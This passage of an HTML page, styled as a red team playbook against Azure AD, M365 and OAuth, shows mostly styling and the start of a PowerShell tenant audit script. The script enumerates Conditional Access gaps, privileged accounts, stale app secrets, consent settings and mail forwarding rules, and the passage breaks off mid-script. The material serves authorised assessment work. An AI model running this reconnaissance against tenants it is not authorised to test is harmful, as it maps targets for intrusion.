@@ -1,0 +1,2418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RED TEAM OPS — Azure AD / M365 / OAuth — Full Scripts</title>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Syne:wght@400;500;600;700;800&family=Outfit:wght@300;400;500;600;700&family=Azeret+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-void: #050508;
+  --bg-primary: #0a0b10;
+  --bg-card: #0e1017;
+  --bg-elevated: #13151f;
+  --bg-code: #06070c;
+  --border: #1a1c2e;
+  --border-active: #2a2d4a;
+  --red: #ff2a44;
+  --red-soft: rgba(255,42,68,0.12);
+  --red-mid: rgba(255,42,68,0.25);
+  --cyan: #00d4ff;
+  --cyan-soft: rgba(0,212,255,0.10);
+  --green: #00e87b;
+  --green-soft: rgba(0,232,123,0.10);
+  --amber: #ffa726;
+  --amber-soft: rgba(255,167,38,0.10);
+  --purple: #a78bfa;
+  --purple-soft: rgba(167,139,250,0.10);
+  --blue: #60a5fa;
+  --blue-soft: rgba(96,165,250,0.10);
+  --text: #c8c8d8;
+  --text-bright: #eef0ff;
+  --text-dim: #5a5c78;
+  --text-muted: #40425a;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body {
+  background: var(--bg-void);
+  color: var(--text);
+  font-family: 'Outfit', sans-serif;
+  line-height: 1.75;
+  -webkit-font-smoothing: antialiased;
+}
+
+body::after {
+  content:'';
+  position:fixed;
+  inset:0;
+  background:
+    repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,0.008) 3px,rgba(255,255,255,0.008) 4px),
+    radial-gradient(ellipse at 20% 0%, rgba(255,42,68,0.04) 0%, transparent 60%),
+    radial-gradient(ellipse at 80% 100%, rgba(0,212,255,0.03) 0%, transparent 60%);
+  pointer-events:none;
+  z-index:-1;
+}
+
+.wrap { max-width: 1320px; margin: 0 auto; padding: 0 36px; }
+
+/* ─── NAV BAR ─── */
+.topbar {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  backdrop-filter: blur(20px);
+  background: rgba(5,5,8,0.85);
+  border-bottom: 1px solid var(--border);
+  padding: 14px 0;
+}
+.topbar-inner {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.topbar-brand {
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: 15px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--red);
+}
+.topbar-meta {
+  display: flex;
+  gap: 24px;
+  font-family: 'Azeret Mono', monospace;
+  font-size: 11px;
+  color: var(--text-dim);
+}
+.topbar-meta span { color: var(--text-muted); }
+.topbar-meta strong { color: var(--cyan); font-weight: 500; }
+
+/* ─── TOC / NAV ─── */
+.toc {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  padding: 24px 0;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 60px;
+}
+.toc a {
+  font-family: 'Azeret Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  text-decoration: none;
+  padding: 6px 14px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  color: var(--text-dim);
+  transition: all .25s;
+}
+.toc a:hover { border-color: var(--red); color: var(--red); background: var(--red-soft); }
+
+/* ─── HERO ─── */
+.hero {
+  padding: 80px 0 60px;
+  position: relative;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  padding: 5px 14px;
+  background: var(--red-soft);
+  border: 1px solid var(--red-mid);
+  border-radius: 4px;
+  font-family: 'Azeret Mono', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  color: var(--red);
+  margin-bottom: 28px;
+}
+.hero-badge .pulse {
+  width: 6px; height: 6px;
+  background: var(--red);
+  border-radius: 50%;
+  animation: blink 1.4s infinite;
+}
+@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:.15;} }
+
+.hero h1 {
+  font-family: 'Syne', sans-serif;
+  font-size: 58px;
+  font-weight: 800;
+  line-height: 1.08;
+  letter-spacing: -1.5px;
+  color: var(--text-bright);
+  margin-bottom: 14px;
+  max-width: 900px;
+}
+.hero h1 em {
+  font-style: normal;
+  background: linear-gradient(135deg, var(--red), var(--cyan));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+.hero-desc {
+  font-size: 15px;
+  color: var(--text-dim);
+  max-width: 700px;
+  margin-bottom: 40px;
+}
+
+/* ─── SECTION SYSTEM ─── */
+.section { margin-bottom: 80px; }
+
+.sec-head {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 32px;
+  padding-bottom: 14px;
+  border-bottom: 1px solid var(--border);
+}
+.sec-num {
+  font-family: 'Azeret Mono', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 2px;
+  padding: 4px 10px;
+  border-radius: 3px;
+  color: var(--red);
+  background: var(--red-soft);
+  border: 1px solid var(--red-mid);
+}
+.sec-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 26px;
+  font-weight: 700;
+  color: var(--text-bright);
+}
+
+/* ─── TEST BLOCK ─── */
+.test-block {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  margin-bottom: 24px;
+  overflow: hidden;
+  transition: border-color .3s;
+}
+.test-block:hover { border-color: var(--border-active); }
+
+.test-header {
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  padding: 24px 28px 20px;
+  border-bottom: 1px solid var(--border);
+  cursor: pointer;
+  user-select: none;
+}
+.test-header:hover { background: rgba(255,255,255,0.01); }
+
+.test-indicator {
+  width: 4px;
+  border-radius: 2px;
+  min-height: 50px;
+  flex-shrink: 0;
+}
+.test-indicator.ti-red { background: var(--red); }
+.test-indicator.ti-cyan { background: var(--cyan); }
+.test-indicator.ti-green { background: var(--green); }
+.test-indicator.ti-amber { background: var(--amber); }
+.test-indicator.ti-purple { background: var(--purple); }
+.test-indicator.ti-blue { background: var(--blue); }
+
+.test-info { flex: 1; }
+
+.test-tags {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-bottom: 8px;
+}
+.tag {
+  font-family: 'Azeret Mono', monospace;
+  font-size: 9px;
+  font-weight: 600;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  padding: 2px 8px;
+  border-radius: 3px;
+}
+.tag-mitre { color: var(--red); background: var(--red-soft); }
+.tag-phase { color: var(--cyan); background: var(--cyan-soft); }
+.tag-tool { color: var(--amber); background: var(--amber-soft); }
+.tag-lang { color: var(--purple); background: var(--purple-soft); }
+.tag-sev { color: var(--green); background: var(--green-soft); }
+
+.test-info h3 {
+  font-family: 'Outfit', sans-serif;
+  font-size: 17px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin-bottom: 6px;
+}
+.test-info > p {
+  font-size: 13.5px;
+  color: var(--text-dim);
+}
+
+.test-body { padding: 0 28px 28px; }
+
+.test-body p {
+  font-size: 13.5px;
+  color: var(--text);
+  margin-bottom: 14px;
+}
+
+.test-body h4 {
+  font-family: 'Outfit', sans-serif;
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin: 22px 0 10px;
+  padding-top: 16px;
+  border-top: 1px solid var(--border);
+}
+
+.test-body h4:first-of-type {
+  margin-top: 8px;
+  padding-top: 0;
+  border-top: none;
+}
+
+/* ─── CODE ─── */
+.code {
+  background: var(--bg-code);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin: 12px 0 16px;
+  overflow: hidden;
+}
+.code-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 8px 16px;
+  background: rgba(255,255,255,0.02);
+  border-bottom: 1px solid var(--border);
+}
+.code-lang {
+  font-family: 'Azeret Mono', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  color: var(--text-muted);
+}
+.code-file {
+  font-family: 'Fira Code', monospace;
+  font-size: 10px;
+  color: var(--text-dim);
+}
+.code pre {
+  padding: 18px 20px;
+  overflow-x: auto;
+  font-family: 'Fira Code', monospace;
+  font-size: 12.5px;
+  line-height: 1.85;
+  color: var(--text);
+  tab-size: 4;
+}
+
+/* syntax coloring */
+.c { color: #4a4c65; font-style: italic; }
+.k { color: var(--red); }
+.fn { color: var(--cyan); }
+.s { color: var(--green); }
+.v { color: var(--amber); }
+.p { color: var(--purple); }
+.n { color: #8888a8; }
+.fl { color: var(--blue); }
+.w { color: var(--text-bright); font-weight: 600; }
+
+/* ─── WARNING / INFO BOXES ─── */
+.callout {
+  display: flex;
+  gap: 14px;
+  padding: 16px 20px;
+  border-radius: 6px;
+  margin: 14px 0;
+  font-size: 13px;
+}
+.callout-warn {
+  background: rgba(255,167,38,0.06);
+  border: 1px solid rgba(255,167,38,0.15);
+  color: var(--amber);
+}
+.callout-info {
+  background: rgba(0,212,255,0.06);
+  border: 1px solid rgba(0,212,255,0.15);
+  color: var(--cyan);
+}
+.callout-danger {
+  background: var(--red-soft);
+  border: 1px solid var(--red-mid);
+  color: var(--red);
+}
+.callout-icon { font-size: 16px; flex-shrink: 0; }
+
+/* ─── ATTACK CHAIN VISUAL ─── */
+.chain-visual {
+  display: flex;
+  align-items: stretch;
+  gap: 0;
+  overflow-x: auto;
+  padding: 20px 0;
+  margin: 20px 0 40px;
+}
+.chain-node {
+  flex: 1;
+  min-width: 180px;
+  text-align: center;
+  position: relative;
+  padding: 0 8px;
+}
+.chain-node::after {
+  content: '→';
+  position: absolute;
+  right: -8px;
+  top: 32px;
+  font-size: 18px;
+  color: var(--text-muted);
+}
+.chain-node:last-child::after { display: none; }
+
+.cn-circle {
+  width: 56px;
+  height: 56px;
+  border-radius: 50%;
+  margin: 0 auto 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'Azeret Mono', monospace;
+  font-size: 12px;
+  font-weight: 700;
+}
+.cn-circle.c-red { background: var(--red-soft); border: 2px solid var(--red); color: var(--red); }
+.cn-circle.c-amber { background: var(--amber-soft); border: 2px solid var(--amber); color: var(--amber); }
+.cn-circle.c-purple { background: var(--purple-soft); border: 2px solid var(--purple); color: var(--purple); }
+.cn-circle.c-cyan { background: var(--cyan-soft); border: 2px solid var(--cyan); color: var(--cyan); }
+.cn-circle.c-green { background: var(--green-soft); border: 2px solid var(--green); color: var(--green); }
+.cn-circle.c-blue { background: var(--blue-soft); border: 2px solid var(--blue); color: var(--blue); }
+
+.cn-label {
+  font-family: 'Azeret Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  color: var(--text-dim);
+  margin-bottom: 4px;
+}
+.cn-name {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text-bright);
+}
+
+/* ─── FOOTER ─── */
+.footer {
+  padding: 40px 0;
+  border-top: 1px solid var(--border);
+  margin-top: 40px;
+  text-align: center;
+}
+.footer p {
+  font-family: 'Azeret Mono', monospace;
+  font-size: 10px;
+  color: var(--text-muted);
+  letter-spacing: 1px;
+}
+
+/* ─── RESPONSIVE ─── */
+@media (max-width: 768px) {
+  .wrap { padding: 0 16px; }
+  .hero h1 { font-size: 32px; }
+  .test-header { flex-direction: column; gap: 10px; }
+  .test-indicator { width: 100%; min-height: 3px; }
+  .chain-visual { flex-direction: column; align-items: center; }
+  .chain-node::after { content: '↓'; right: auto; top: auto; bottom: -8px; }
+  .topbar-meta { display: none; }
+}
+</style>
+</head>
+<body>
+
+<!-- ═══ TOPBAR ═══ -->
+<nav class="topbar">
+  <div class="wrap topbar-inner">
+    <div class="topbar-brand">⬡ RED TEAM OPS</div>
+    <div class="topbar-meta">
+      <div><span>TARGET </span><strong>Azure AD / M365 / OAuth</strong></div>
+      <div><span>DATE </span><strong>2026-02-07</strong></div>
+      <div><span>FRAMEWORK </span><strong>MITRE ATT&CK Cloud</strong></div>
+    </div>
+  </div>
+</nav>
+
+<div class="wrap">
+
+<!-- ═══ TOC ═══ -->
+<div class="toc">
+  <a href="#s1">01 Misconfig Recon</a>
+  <a href="#s2">02 OAuth Abuse</a>
+  <a href="#s3">03 Credential Attacks</a>
+  <a href="#s4">04 Privilege Escalation</a>
+  <a href="#s5">05 Persistence</a>
+  <a href="#s6">06 Lateral Movement</a>
+  <a href="#s7">07 Data Exfiltration</a>
+  <a href="#s8">08 Artifact Collection</a>
+  <a href="#s9">09 Detection Engineering</a>
+</div>
+
+<!-- ═══ HERO ═══ -->
+<header class="hero">
+  <div class="hero-badge"><span class="pulse"></span>CONFIDENTIAL — AUTHORIZED ASSESSMENT ONLY</div>
+  <h1>Full Attack Scripts<br><em>Azure AD · M365 · OAuth</em></h1>
+  <p class="hero-desc">Complete red team playbook with executable scripts for every phase of the cloud-native kill chain. Each test includes the script, expected output, MITRE mapping, and forensic artifacts generated.</p>
+</header>
+
+<!-- ═══ CHAIN VISUAL ═══ -->
+<div class="chain-visual">
+  <div class="chain-node">
+    <div class="cn-circle c-red">01</div>
+    <div class="cn-label">Phase 1</div>
+    <div class="cn-name">Misconfig Recon</div>
+  </div>
+  <div class="chain-node">
+    <div class="cn-circle c-amber">02</div>
+    <div class="cn-label">Phase 2</div>
+    <div class="cn-name">OAuth Abuse</div>
+  </div>
+  <div class="chain-node">
+    <div class="cn-circle c-purple">03</div>
+    <div class="cn-label">Phase 3</div>
+    <div class="cn-name">Credential Attacks</div>
+  </div>
+  <div class="chain-node">
+    <div class="cn-circle c-cyan">04</div>
+    <div class="cn-label">Phase 4</div>
+    <div class="cn-name">Priv Escalation</div>
+  </div>
+  <div class="chain-node">
+    <div class="cn-circle c-blue">05</div>
+    <div class="cn-label">Phase 5</div>
+    <div class="cn-name">Persistence</div>
+  </div>
+  <div class="chain-node">
+    <div class="cn-circle c-green">06</div>
+    <div class="cn-label">Phase 6</div>
+    <div class="cn-name">Exfil &amp; Artifacts</div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 01 — MISCONFIGURATION RECONNAISSANCE          -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s1">
+<div class="sec-head">
+  <span class="sec-num">01</span>
+  <h2 class="sec-title">Misconfiguration Reconnaissance</h2>
+</div>
+
+<!-- TEST 1.1 -->
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-red"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1526</span>
+        <span class="tag tag-phase">RECON</span>
+        <span class="tag tag-lang">POWERSHELL</span>
+      </div>
+      <h3>1.1 — Full Tenant Misconfiguration Audit</h3>
+      <p>Enumerate Conditional Access, legacy auth status, MFA gaps, privileged roles, stale apps, and mail forwarding in a single sweep.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <div class="callout callout-warn">
+      <span class="callout-icon">⚠</span>
+      <span>Requires authorized access. Connect with an account that has at minimum Security Reader + Global Reader roles.</span>
+    </div>
+
+    <h4>Script: Tenant Configuration Audit</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">PowerShell</span>
+        <span class="code-file">Invoke-TenantAudit.ps1</span>
+      </div>
+<pre><span class="c">#Requires -Modules Microsoft.Graph.Authentication, Microsoft.Graph.Identity.SignIns,</span>
+<span class="c">#  Microsoft.Graph.Identity.DirectoryManagement, Microsoft.Graph.Applications</span>
+
+<span class="c">########################################################################</span>
+<span class="c"># Invoke-TenantAudit.ps1</span>
+<span class="c"># Red Team — Azure AD / M365 Misconfiguration Recon</span>
+<span class="c"># Outputs findings to a timestamped JSON report.</span>
+<span class="c">########################################################################</span>
+
+<span class="k">param</span>(
+    [<span class="p">string</span>]<span class="v">$OutputDir</span> = <span class="s">".\AuditResults"</span>
+)
+
+<span class="c"># ── 0. Setup ──</span>
+<span class="v">$timestamp</span> = <span class="fn">Get-Date</span> <span class="k">-Format</span> <span class="s">"yyyyMMdd_HHmmss"</span>
+<span class="fn">New-Item</span> <span class="k">-ItemType</span> Directory <span class="k">-Path</span> <span class="v">$OutputDir</span> <span class="k">-Force</span> | <span class="fn">Out-Null</span>
+<span class="v">$report</span> = @{ Timestamp = <span class="v">$timestamp</span>; Findings = @() }
+
+<span class="k">function</span> <span class="fn">Add-Finding</span> {
+    <span class="k">param</span>(<span class="v">$Category</span>, <span class="v">$Severity</span>, <span class="v">$Title</span>, <span class="v">$Detail</span>, <span class="v">$MitreId</span>)
+    <span class="v">$report</span>.Findings += @{
+        Category = <span class="v">$Category</span>; Severity = <span class="v">$Severity</span>
+        Title    = <span class="v">$Title</span>;    Detail   = <span class="v">$Detail</span>
+        MITRE    = <span class="v">$MitreId</span>;   Time     = (<span class="fn">Get-Date</span> <span class="k">-Format</span> <span class="s">"o"</span>)
+    }
+    <span class="fn">Write-Host</span> <span class="s">"[<span class="v">$Severity</span>] <span class="v">$Title</span>"</span> <span class="k">-ForegroundColor</span> $(
+        <span class="k">switch</span>(<span class="v">$Severity</span>) {
+            <span class="s">'CRITICAL'</span> { <span class="s">'Red'</span> }
+            <span class="s">'HIGH'</span>     { <span class="s">'Yellow'</span> }
+            <span class="s">'MEDIUM'</span>   { <span class="s">'Cyan'</span> }
+            <span class="k">default</span>    { <span class="s">'Gray'</span> }
+        }
+    )
+}
+
+<span class="c"># ── 1. Connect ──</span>
+<span class="fn">Write-Host</span> <span class="s">"[*] Connecting to Microsoft Graph..."</span> <span class="k">-ForegroundColor</span> Cyan
+<span class="fn">Connect-MgGraph</span> <span class="k">-Scopes</span> @(
+    <span class="s">"Directory.Read.All"</span>,
+    <span class="s">"Policy.Read.All"</span>,
+    <span class="s">"Application.Read.All"</span>,
+    <span class="s">"RoleManagement.Read.Directory"</span>,
+    <span class="s">"AuditLog.Read.All"</span>,
+    <span class="s">"Mail.Read"</span>
+)
+
+<span class="c"># ── 2. Conditional Access Policy Analysis ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Analyzing Conditional Access Policies..."</span>
+<span class="v">$caPolicies</span> = <span class="fn">Get-MgIdentityConditionalAccessPolicy</span> <span class="k">-All</span>
+
+<span class="k">if</span> (<span class="v">$caPolicies</span>.Count <span class="k">-eq</span> 0) {
+    <span class="fn">Add-Finding</span> <span class="s">"ConditionalAccess"</span> <span class="s">"CRITICAL"</span> `
+        <span class="s">"No Conditional Access policies found"</span> `
+        <span class="s">"Tenant has zero CA policies — all access is unrestricted."</span> `
+        <span class="s">"T1078.004"</span>
+} <span class="k">else</span> {
+    <span class="c"># Check for legacy auth blocking</span>
+    <span class="v">$legacyBlock</span> = <span class="v">$caPolicies</span> | <span class="fn">Where-Object</span> {
+        <span class="v">$_</span>.Conditions.ClientAppTypes <span class="k">-contains</span> <span class="s">"exchangeActiveSync"</span> <span class="k">-or</span>
+        <span class="v">$_</span>.Conditions.ClientAppTypes <span class="k">-contains</span> <span class="s">"other"</span>
+    } | <span class="fn">Where-Object</span> {
+        <span class="v">$_</span>.GrantControls.BuiltInControls <span class="k">-contains</span> <span class="s">"block"</span> <span class="k">-and</span>
+        <span class="v">$_</span>.State <span class="k">-eq</span> <span class="s">"enabled"</span>
+    }
+
+    <span class="k">if</span> (<span class="k">-not</span> <span class="v">$legacyBlock</span>) {
+        <span class="fn">Add-Finding</span> <span class="s">"ConditionalAccess"</span> <span class="s">"CRITICAL"</span> `
+            <span class="s">"Legacy authentication not blocked"</span> `
+            <span class="s">"No enabled CA policy blocks legacy auth (IMAP/POP3/SMTP). These bypass MFA."</span> `
+            <span class="s">"T1078.004"</span>
+    }
+
+    <span class="c"># Check if MFA is enforced for all users on all cloud apps</span>
+    <span class="v">$mfaAll</span> = <span class="v">$caPolicies</span> | <span class="fn">Where-Object</span> {
+        <span class="v">$_</span>.Conditions.Applications.IncludeApplications <span class="k">-contains</span> <span class="s">"All"</span> <span class="k">-and</span>
+        <span class="v">$_</span>.Conditions.Users.IncludeUsers <span class="k">-contains</span> <span class="s">"All"</span> <span class="k">-and</span>
+        (<span class="v">$_</span>.GrantControls.BuiltInControls <span class="k">-contains</span> <span class="s">"mfa"</span> <span class="k">-or</span>
+         <span class="v">$_</span>.GrantControls.AuthenticationStrength) <span class="k">-and</span>
+        <span class="v">$_</span>.State <span class="k">-eq</span> <span class="s">"enabled"</span>
+    }
+
+    <span class="k">if</span> (<span class="k">-not</span> <span class="v">$mfaAll</span>) {
+        <span class="fn">Add-Finding</span> <span class="s">"ConditionalAccess"</span> <span class="s">"HIGH"</span> `
+            <span class="s">"No universal MFA policy for all cloud apps"</span> `
+            <span class="s">"No single enabled policy enforces MFA for All Users on All Cloud Apps."</span> `
+            <span class="s">"T1078.004"</span>
+    }
+
+    <span class="c"># Check for phishing-resistant MFA requirement</span>
+    <span class="v">$phishResistant</span> = <span class="v">$caPolicies</span> | <span class="fn">Where-Object</span> {
+        <span class="v">$_</span>.GrantControls.AuthenticationStrength.DisplayName <span class="k">-match</span> <span class="s">"[Pp]hishing"</span> <span class="k">-and</span>
+        <span class="v">$_</span>.State <span class="k">-eq</span> <span class="s">"enabled"</span>
+    }
+
+    <span class="k">if</span> (<span class="k">-not</span> <span class="v">$phishResistant</span>) {
+        <span class="fn">Add-Finding</span> <span class="s">"ConditionalAccess"</span> <span class="s">"HIGH"</span> `
+            <span class="s">"No phishing-resistant MFA enforcement"</span> `
+            <span class="s">"No CA policy requires phishing-resistant auth strength (FIDO2/WHfB). AiTM viable."</span> `
+            <span class="s">"T1556"</span>
+    }
+
+    <span class="c"># List all policies for manual review</span>
+    <span class="k">foreach</span> (<span class="v">$pol</span> <span class="k">in</span> <span class="v">$caPolicies</span>) {
+        <span class="fn">Write-Host</span> <span class="s">"  CA: [<span class="v">$($pol.State)</span>] <span class="v">$($pol.DisplayName)</span>"</span>
+    }
+}
+
+<span class="c"># ── 3. Privileged Role Enumeration ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Enumerating privileged role assignments..."</span>
+<span class="v">$dangerousRoles</span> = @(
+    <span class="s">"Global Administrator"</span>,
+    <span class="s">"Application Administrator"</span>,
+    <span class="s">"Cloud Application Administrator"</span>,
+    <span class="s">"Privileged Role Administrator"</span>,
+    <span class="s">"Privileged Authentication Administrator"</span>,
+    <span class="s">"Exchange Administrator"</span>,
+    <span class="s">"SharePoint Administrator"</span>,
+    <span class="s">"Compliance Administrator"</span>,
+    <span class="s">"Intune Administrator"</span>
+)
+
+<span class="v">$roles</span> = <span class="fn">Get-MgDirectoryRole</span> <span class="k">-All</span>
+<span class="k">foreach</span> (<span class="v">$role</span> <span class="k">in</span> <span class="v">$roles</span>) {
+    <span class="k">if</span> (<span class="v">$role</span>.DisplayName <span class="k">-in</span> <span class="v">$dangerousRoles</span>) {
+        <span class="v">$members</span> = <span class="fn">Get-MgDirectoryRoleMember</span> <span class="k">-DirectoryRoleId</span> <span class="v">$role</span>.Id <span class="k">-All</span>
+        <span class="k">foreach</span> (<span class="v">$m</span> <span class="k">in</span> <span class="v">$members</span>) {
+            <span class="fn">Write-Host</span> <span class="s">"  ROLE: <span class="v">$($role.DisplayName)</span> → <span class="v">$($m.AdditionalProperties.displayName)</span> (<span class="v">$($m.AdditionalProperties.userPrincipalName)</span>)"</span>
+        }
+        <span class="k">if</span> (<span class="v">$role</span>.DisplayName <span class="k">-eq</span> <span class="s">"Global Administrator"</span> <span class="k">-and</span> <span class="v">$members</span>.Count <span class="k">-gt</span> 5) {
+            <span class="fn">Add-Finding</span> <span class="s">"Privilege"</span> <span class="s">"HIGH"</span> `
+                <span class="s">"Excessive Global Admins: <span class="v">$($members.Count)</span> accounts"</span> `
+                <span class="s">"Best practice is &lt;5 permanent GA assignments."</span> `
+                <span class="s">"T1078.004"</span>
+        }
+    }
+}
+
+<span class="c"># ── 4. OAuth Application Audit ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Auditing OAuth application registrations..."</span>
+<span class="v">$apps</span> = <span class="fn">Get-MgApplication</span> <span class="k">-All</span> <span class="k">-Property</span> <span class="s">"DisplayName,AppId,RequiredResourceAccess,PasswordCredentials,KeyCredentials,CreatedDateTime"</span>
+
+<span class="v">$highPrivPerms</span> = @(
+    <span class="s">"Mail.ReadWrite"</span>, <span class="s">"Mail.Read"</span>, <span class="s">"Mail.Send"</span>,
+    <span class="s">"Files.ReadWrite.All"</span>, <span class="s">"Directory.ReadWrite.All"</span>,
+    <span class="s">"RoleManagement.ReadWrite.Directory"</span>,
+    <span class="s">"AppRoleAssignment.ReadWrite.All"</span>,
+    <span class="s">"User.ReadWrite.All"</span>, <span class="s">"Group.ReadWrite.All"</span>
+)
+
+<span class="k">foreach</span> (<span class="v">$app</span> <span class="k">in</span> <span class="v">$apps</span>) {
+    <span class="c"># Check for stale credentials (>180 days old)</span>
+    <span class="k">foreach</span> (<span class="v">$cred</span> <span class="k">in</span> <span class="v">$app</span>.PasswordCredentials) {
+        <span class="v">$age</span> = (<span class="fn">Get-Date</span>) - <span class="v">$cred</span>.StartDateTime
+        <span class="k">if</span> (<span class="v">$age</span>.Days <span class="k">-gt</span> 180) {
+            <span class="fn">Add-Finding</span> <span class="s">"OAuth"</span> <span class="s">"MEDIUM"</span> `
+                <span class="s">"Stale credential on app: <span class="v">$($app.DisplayName)</span>"</span> `
+                <span class="s">"Secret '<span class="v">$($cred.DisplayName)</span>' is <span class="v">$($age.Days)</span> days old. Expires: <span class="v">$($cred.EndDateTime)</span>"</span> `
+                <span class="s">"T1098.003"</span>
+        }
+    }
+
+    <span class="c"># Check for dangerous permissions requested</span>
+    <span class="k">foreach</span> (<span class="v">$rra</span> <span class="k">in</span> <span class="v">$app</span>.RequiredResourceAccess) {
+        <span class="k">foreach</span> (<span class="v">$ra</span> <span class="k">in</span> <span class="v">$rra</span>.ResourceAccess) {
+            <span class="c"># Map permission GUID to name (simplified — production should use SP lookup)</span>
+            <span class="fn">Write-Host</span> <span class="s">"  APP: <span class="v">$($app.DisplayName)</span> | PermId: <span class="v">$($ra.Id)</span> | Type: <span class="v">$($ra.Type)</span>"</span>
+        }
+    }
+
+    <span class="c"># Check for multi-tenant apps</span>
+    <span class="v">$spn</span> = <span class="fn">Get-MgServicePrincipal</span> <span class="k">-Filter</span> <span class="s">"appId eq '<span class="v">$($app.AppId)</span>'"</span> <span class="k">-ErrorAction</span> SilentlyContinue
+    <span class="k">if</span> (<span class="v">$spn</span> <span class="k">-and</span> <span class="v">$spn</span>.AppOwnerOrganizationId <span class="k">-ne</span> (<span class="fn">Get-MgOrganization</span>).Id) {
+        <span class="fn">Add-Finding</span> <span class="s">"OAuth"</span> <span class="s">"MEDIUM"</span> `
+            <span class="s">"External multi-tenant app: <span class="v">$($app.DisplayName)</span>"</span> `
+            <span class="s">"Owned by external org: <span class="v">$($spn.AppOwnerOrganizationId)</span>"</span> `
+            <span class="s">"T1098.003"</span>
+    }
+}
+
+<span class="c"># ── 5. User Consent Settings ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Checking user consent configuration..."</span>
+<span class="v">$authPolicy</span> = <span class="fn">Get-MgPolicyAuthorizationPolicy</span>
+<span class="k">if</span> (<span class="v">$authPolicy</span>.DefaultUserRolePermissions.AllowedToCreateApps <span class="k">-eq</span> <span class="v">$true</span>) {
+    <span class="fn">Add-Finding</span> <span class="s">"OAuth"</span> <span class="s">"HIGH"</span> `
+        <span class="s">"Users allowed to register applications"</span> `
+        <span class="s">"Any user can create app registrations — enables illicit consent grant staging."</span> `
+        <span class="s">"T1098.003"</span>
+}
+<span class="k">if</span> (<span class="v">$authPolicy</span>.PermissionGrantPolicyIdsAssignedToDefaultUserRole <span class="k">-contains</span> `
+    <span class="s">"microsoft-user-default-legacy"</span>) {
+    <span class="fn">Add-Finding</span> <span class="s">"OAuth"</span> <span class="s">"CRITICAL"</span> `
+        <span class="s">"Users can consent to any app (legacy policy)"</span> `
+        <span class="s">"Legacy consent policy active — users can grant any delegated permission to 3rd-party apps."</span> `
+        <span class="s">"T1098.003"</span>
+}
+
+<span class="c"># ── 6. Mail Forwarding Rules ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Checking for external mail forwarding rules..."</span>
+<span class="c"># Note: Requires Exchange Online Management module for full audit</span>
+<span class="c"># This uses Graph as fallback</span>
+<span class="k">try</span> {
+    <span class="v">$users</span> = <span class="fn">Get-MgUser</span> <span class="k">-All</span> <span class="k">-Property</span> <span class="s">"DisplayName,Mail,UserPrincipalName"</span> <span class="k">-Top</span> 100
+    <span class="k">foreach</span> (<span class="v">$user</span> <span class="k">in</span> <span class="v">$users</span>) {
+        <span class="v">$rules</span> = <span class="fn">Get-MgUserMailFolderMessageRule</span> <span class="k">-UserId</span> <span class="v">$user</span>.Id `
+            <span class="k">-MailFolderId</span> <span class="s">"inbox"</span> <span class="k">-ErrorAction</span> SilentlyContinue
+        <span class="k">foreach</span> (<span class="v">$rule</span> <span class="k">in</span> <span class="v">$rules</span>) {
+            <span class="k">if</span> (<span class="v">$rule</span>.Actions.ForwardTo <span class="k">-or</span> <span class="v">$rule</span>.Actions.RedirectTo) {
+                <span class="v">$target</span> = (<span class="v">$rule</span>.Actions.ForwardTo + <span class="v">$rule</span>.Actions.RedirectTo) |
+                    <span class="fn">Select-Object</span> <span class="k">-ExpandProperty</span> EmailAddress <span class="k">-ErrorAction</span> SilentlyContinue
+                <span class="fn">Add-Finding</span> <span class="s">"M365"</span> <span class="s">"HIGH"</span> `
+                    <span class="s">"Mail forwarding rule on <span class="v">$($user.UserPrincipalName)</span>"</span> `
